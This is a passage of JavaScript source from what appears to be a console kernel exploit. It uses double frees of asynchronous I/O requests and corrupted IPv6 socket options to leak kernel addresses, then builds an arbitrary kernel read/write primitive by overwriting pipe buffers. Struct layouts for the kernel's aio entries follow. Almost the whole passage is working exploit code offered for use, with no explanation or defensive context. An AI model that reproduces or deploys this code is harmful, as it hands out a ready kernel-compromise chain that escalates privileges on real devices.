  const nhop_addr = mem.alloc(4);
  const buf_addr = mem.alloc(8);

  function kread8(addr) {
    if (addr.eq(0)) {
      throw new Error('Empty addr !!');
    }

    arw.view(pktinfo_addr).setBInt(0, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo

    let offset = 0;
    while (offset < 8) {
      arw.view(pktinfo_addr).setBInt(8, addr.add(offset), true); // pktopts.ip6po_nexthop = addr + offset

      if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
        throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
      }

      arw.view(nhop_addr).setInt32(0, 8 - offset, true);

      if (fn.getsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_NEXTHOP, buf_addr.add(offset), nhop_addr) === -1) {
        throw new SyscallError(`Unable to get socket option for fd ${pktopts_twins[0]} !!`);
      }

      const n = arw.view(nhop_addr).getInt32(0, true);
      if (n === 0) {
        arw.view(buf_addr).setUint8(offset, 0);
        offset += 1;
      } else {
        offset += n;
      }
    }

    return arw.view(buf_addr).getBInt(0, true);
  }

  kread8(evf_cv_addr);
  const kstr = String.from(buf_addr);
  logger.debug(`kstr: ${kstr}`);

  if (kstr !== 'evf cv') {
    throw new Error(`Expected 'evf cv' got ${kstr} !!`);
  }

  if (version.console === 4) {
    kernel_base = evf_cv_addr.sub(impl.k_evf_cv_desc);
    logger.info(`kernel base: ${kernel_base}`);
  }

  const p = kread8(aio_info_addr.add(8));
  logger.debug(`proc: ${p}`);

  const mask = new BInt('0xffff000000000000');
  if (p.and(mask).neq(mask)) {
    throw new Error(`${p} is not valid kernel address !!`);
  }

  const p_pid = kread8(p.add(k_proc_pid));
  logger.debug(`p_pid: ${p_pid.i}`);

  const pid = fn.getpid.invoke();
  logger.debug(`pid: ${pid}`);

  if (pid !== Number(p_pid)) {
    throw new Error(`Expected pid ${pid} got ${p_pid} !!`);
  }

  const p_fd = kread8(p.add(0x48));
  logger.debug(`p_fd: ${p_fd}`);

  fdt_ofiles = kread8(p_fd).add(k_filedesc_fdt_ofiles);
  logger.debug(`fdt_ofiles: ${fdt_ofiles}`);

  const master_pipe_fp = kread8(fdt_ofiles.add(master_pipe[0] * k_filedesc_sizeof));
  logger.debug(`master_pipe_fp: ${master_pipe_fp}`);

  const victim_pipe_fp = kread8(fdt_ofiles.add(victim_pipe[0] * k_filedesc_sizeof));
  logger.debug(`victim_pipe_fp: ${victim_pipe_fp}`);

  const master_pipe_f_data = kread8(master_pipe_fp);
  logger.debug(`master_pipe_f_data: ${master_pipe_f_data}`);

  const victim_pipe_f_data = kread8(victim_pipe_fp);
  logger.debug(`victim_pipe_f_data: ${victim_pipe_f_data}`);

  mem.bset(pktinfo_addr, 0x14);

  arw.view(pktinfo_addr).setBInt(0, master_pipe_f_data.add(8), true); // pktopts.ip6po_pktinfo = &((pipe *)master_pipe_fp->f_data)->pipe_buffer.out
  arw.view(pktinfo_addr).setBInt(8, 0, true); // pktopts.ip6po_nexthop = 0

  if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
  }

  arw.view(pktinfo_addr).setUint32(0, 0, true); // pipebuf.out
  arw.view(pktinfo_addr).setUint32(4, PAGE_SIZE, true); // pipebuf.size
  arw.view(pktinfo_addr).setBInt(8, victim_pipe_f_data, true); // pipebuf.buffer

  if (fn.setsockopt.invoke(pktopts_twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${pktopts_twins[0]} !!`);
  }

  kv = new KernelView(master_pipe, victim_pipe);

  inc_karw_pipe_refcnt();

  logger.info('Achieved kernel ARW !!');
}
async function exploit_main() {
  logger.info('===LAPSE===');

  try {
    init();
    setup();
    await double_free_reqs2();
    leak_kaddrs();
    double_free_reqs1();
    make_karw();

    logger.info('Corrupted context cleanup started...');

    // Remove pktinfo pointers
    remove_pktinfo_from_so(pktopts_twins[0]);

    // Remove rthdr pointers
    remove_rthdr_from_so(pktopts_twins[1]);
    remove_rthdr_from_so(rthdr_twins[0]);

    logger.info('Corrupted context cleanup completed !!');
  } finally {
    try {
      cleanup();
    } catch (cleanup_err) {
      logger.error(`Unable to cleanup: ${cleanup_err}`);
    }
  }

  logger.info('===END===');
}
//#endregion
//#region Structs
const linger = new Struct('linger', [
  { type: 'Int32', name: 'l_onoff' },
  { type: 'Int32', name: 'l_linger' },
]);

const SceKernelAioResult = new Struct('SceKernelAioResult', [
  { type: 'Int64', name: 'return_value' },
  { type: 'Int32', name: 'state' },
  { type: 'Uint32', name: '_pad' },
]);

const SceKernelAioRWRequest = new Struct('SceKernelAioRWRequest', [
  { type: 'Uint64', name: 'offset' },
  { type: 'Uint64', name: 'nbyte' },
  { type: 'Uint64', name: 'buf' },
  { type: 'SceKernelAioResult*', name: 'result' },
  { type: 'Int32', name: 'fd' },
]);

const aio_entry = new Struct('aio_entry', [
  { type: 'Uint32', name: 'ar2_cmd' },
  { type: 'Uint32', name: 'ar2_ticket' },
  { type: 'Uint8', name: '_unk1', count: 8 },
  { type: 'Uint64', name: 'ar2_reqs1' },
  { type: 'Uint64', name: 'ar2_info' },
  { type: 'Uint64', name: 'ar2_batch' },
  { type: 'Uint64', name: 'ar2_spinfo' },
  { type: 'SceKernelAioResult', name: 'ar2_result' },
  { type: 'Uint64', name: 'ar2_file' },
  { type: 'Uint64', name: '_unk2' },
  { type: 'Uint64', name: 'ar2_qentry' },
  { type: 'Uint8', name: '_pad2', count: 0x28 },
]);

const aio_batch = new Struct('aio_batch', [
  { type: 'Uint32', name: 'ar3_num_reqs' },
  { type: 'Uint32', name: 'ar3_reqs_left' },
  { type: 'Uint32', name: 'ar3_state' },
  { type: 'Uint32', name: 'ar3_done' },
  { type: 'Uint8', name: '_unk1', count: 0x18 },
  { type: 'Uint32', name: 'lock_object_flags' },
  { type: 'Uint8', name: '_unk2', count: 0x0c },
  { type: 'Uint64', name: 'lock_object_lock' },
  { type: 'Uint8', name: '_unk3', count: 0x10 },
  { type: 'Uint64', name: 'ar3_waiter' },
  { type: 'Uint8', name: '_pad2', count: 0x28 },
]);
//#endregion
